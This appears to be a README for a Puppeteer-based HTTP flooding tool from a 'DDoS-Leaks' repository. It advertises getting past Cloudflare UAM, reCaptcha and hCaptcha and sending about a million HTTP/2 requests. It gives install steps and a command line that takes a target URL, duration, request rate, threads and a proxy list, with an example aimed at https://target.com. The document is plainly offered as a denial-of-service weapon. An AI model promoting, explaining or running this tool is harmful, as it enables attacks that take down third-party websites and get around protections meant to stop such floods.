<p align="center">
The new method, utilizing a native browser with Puppeteer, can bypass captcha, Cloudflare UAM, reCaptcha, hCaptcha, and 0% HTTP DDOS.
</p>

#
## First install the required modules

```bash
node setup.js
```

# Real browser Leaks

- High Requests HTTP/2.0 ( 1M Req )
- Bypass UAM HTTP/2.0 ( Cloudflare )
- Bypass Captcha ( Cloudflare )
- 0% HTTP DDOS
- Support %RAND%

## How to use (git clone)

1. Download or git clone this repository:

    ```bash
    git clone https://github.com/DDoS-Leaks/Browser/
    ```

2. Navigate to the cloned repository:

    ```bash
    cd Browser
    ```

3. Run the `browser.js` script:

    ```bash
    node browser.js
    ```
    
## Run the script

```bash
xvfb-run -a node browser.js url time rps thread proxy.txt --rand true/false --smart true/false
```

```bash
node browser.js https://target.com 300 120 15 http.txt --rand true --smart true
```
